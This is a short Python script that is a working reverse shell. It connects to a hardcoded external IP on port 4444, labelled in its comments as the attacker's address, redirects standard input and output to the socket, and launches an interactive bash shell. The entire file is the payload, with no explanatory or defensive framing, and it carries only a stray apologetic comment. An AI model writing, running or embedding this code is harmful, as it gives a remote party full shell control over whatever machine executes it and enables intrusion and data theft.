import socket
import subprocess
import os
#please don't judge me, lt.

# Attacker's IP and port (they must be listening on their machine)
ATTACKER_IP = "73.200.114.16"  # or raw IP like "123.45.67.89"
ATTACKER_PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, ATTACKER_PORT))

# Redirect stdin, stdout, stderr to the socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Spawn a shell
subprocess.call(["/bin/bash", "-i"])
